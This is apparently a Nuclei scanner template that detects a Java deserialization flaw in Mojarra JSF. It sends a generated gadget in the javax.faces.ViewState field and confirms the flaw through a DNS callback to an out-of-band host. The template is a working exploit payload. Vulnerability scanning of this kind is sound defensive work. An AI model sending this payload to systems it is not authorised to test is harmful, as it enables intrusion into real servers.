id: mojarra-jsf-viewstate-deserialization
info:
  name: Mojarra JSF ViewState Deserialization Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: dnslog, deserialization

variables:
  reverse: "{{interactsh-url}}"
  gadget: "{{generate_java_gadget('dns', reverse, 'gzip-base64')}}"
  payload: "{{url_encode(gadget)}}"

http:
  - raw:
      - |
        POST /index.xhtml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_idt6=j_idt6&j_idt6%3Aj_idt7=aaaa&j_idt6%3Aj_idt8=Hello&javax.faces.ViewState={{payload}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "java.io.ObjectInputStream.readObject"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
